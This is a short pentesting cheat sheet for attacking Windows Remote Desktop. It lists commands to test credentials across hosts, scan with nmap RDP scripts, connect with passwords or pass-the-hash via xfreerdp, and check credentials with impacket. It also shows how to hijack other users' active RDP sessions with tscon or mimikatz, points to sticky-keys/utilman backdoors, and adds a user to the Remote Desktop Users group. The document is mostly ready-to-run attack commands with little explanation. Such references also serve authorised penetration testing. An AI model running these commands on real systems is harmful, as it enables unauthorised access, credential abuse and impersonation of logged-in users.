# command for RDP test
Cesar Alfredo Corrales Rizo

# https://github.com/Hypnoze57/RDPChecker
# Test one host: 
python3 RDPChecker.py -d crazy.local -u Hypnoze -p S3cr3t 10.0.0.1

# Test several hosts: 
python3 RDPChecker.py -d crazy.local -u Hypnoze -p S3cr3t 10.0.0.1,10.0.2.2,192.168.1.25,172.26.5.15

# Test several hosts using file: 
python3 RDPChecker.py -d crazy.local -u Hypnoze -p S3cr3t hosts.txt



# NMap scritps
nmap -v --script rdp-enum-encryption -p 3389 -T4 IP
nmap -v --script rdp-vuln-ms12-020 -p 3389 -T4 IP
nmap -v --script rdp-ntlm-info -p 3389 -T4 IP

# Connect with known creds
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>
xfreerdp /u:[domain\]<username> /p:<password> /v:<IP>
xfreerdp /u:[domain\]<username> /pth:<hash> /v:<IP>

# rdp_check.py from impacket let you check if some credentials are valid for a RDP service:
rdp_check <domain>/<name>:<password>@<IP>

# You can launch a new cmd to wich new credentials will be attached so, 
# every interaction this new shell makes with the network will use the new credentials:
runas /netonly /user:<DOMAIN>\<NAME> "cmd.exe" #The password will be prompted

# With Administrator rights you can access any opened RDP session by any user without need to know the password of the owner.
	# Get openned sessions:
	query use

	#Access to the selected session
	tscon <ID> /dest:<SESSIONNAME>

# Now you will be inside the selected RDP session and you will have impersonate a user using only Windows tools and features.

# Important: When you access an active RDP sessions you will kickoff the user that was using it.

# You could get passwords from the process dumping it, 
# but this method is much faster and led you interact with the virtual desktops of the user 
# (passwords in notepad without been saved in disk, other RDP sessions opened in other machines

# You could also use mimikatz to do this:
ts::sessions        #Get sessions
ts::remote /id:2    #Connect to the session

# Sticky-keys & Utilman
# Combining this technique with stickykeys or utilman you will be able to access a administrative CMD and any RDP session anytime.

# Adding User to RDP group
net localgroup "Remote Desktop Users" UserLoginName /add


